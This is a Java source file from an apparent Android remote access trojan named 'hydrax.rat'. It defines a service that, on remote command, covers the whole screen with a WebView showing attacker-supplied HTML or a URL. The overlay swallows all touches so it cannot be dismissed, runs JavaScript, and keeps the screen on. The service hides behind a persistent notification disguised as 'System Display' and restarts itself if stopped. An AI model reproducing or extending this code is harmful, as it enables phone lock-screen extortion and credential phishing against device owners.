package com.hydrax.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;

public class OverlayService extends Service {

    private WindowManager windowManager;
    private View overlayView;
    private boolean overlayActive = false;

    private static OverlayService instance;

    public static OverlayService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        showPersistentNotification();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getStringExtra("action");
            String html = intent.getStringExtra("html");

            if ("show".equals(action) && html != null) {
                showOverlay(html);
            } else if ("hide".equals(action)) {
                removeOverlay();
            }
        }
        return START_STICKY;
    }

    // ==================== OVERLAY LOGIC ====================

    public void showOverlay(String html) {
        if (overlayActive) {
            removeOverlay();
        }

        // Buat WebView untuk menampilkan HTML
        WebView webView = new WebView(this);
        webView.setWebViewClient(new WebViewClient());
        webView.setBackgroundColor(android.graphics.Color.BLACK);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);

        // Block semua touch supaya tidak bisa ditutup
        webView.setOnTouchListener((v, e) -> true);

        // Load HTML
        if (html.startsWith("http") || html.startsWith("https")) {
            webView.loadUrl(html);
        } else {
            webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
        }

        // Buat container
        FrameLayout container = new FrameLayout(this);
        container.addView(webView,
                new FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.MATCH_PARENT));
        container.setBackgroundColor(android.graphics.Color.BLACK);

        // Konfigurasi WindowManager params
        int overlayType;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            overlayType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            overlayType = WindowManager.LayoutParams.TYPE_PHONE;
        }

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                overlayType,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_FULLSCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.CENTER;
        params.x = 0;
        params.y = 0;

        overlayView = container;
        windowManager.addView(overlayView, params);
        overlayActive = true;
    }

    public void removeOverlay() {
        if (overlayView != null && overlayActive) {
            try {
                windowManager.removeView(overlayView);
            } catch (Exception e) {
                // View mungkin sudah dihapus
            }
            overlayView = null;
            overlayActive = false;
        }
    }

    public boolean isOverlayActive() {
        return overlayActive;
    }

    // ==================== NOTIFICATION ====================

    private void showPersistentNotification() {
        String channelId = "hydra_overlay";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "System Display Service",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("System Display");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }

        Notification notification;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, channelId)
                    .setContentTitle("System Display")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_menu_view)
                    .setOngoing(true)
                    .setPriority(Notification.PRIORITY_LOW)
                    .build();
        } else {
            notification = new Notification.Builder(this)
                    .setContentTitle("System Display")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_menu_view)
                    .setOngoing(true)
                    .setPriority(Notification.PRIORITY_LOW)
                    .build();
        }

        startForeground(9998, notification);
    }

    // ==================== BINDER ====================

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        removeOverlay();
        instance = null;
        super.onDestroy();
    }
}
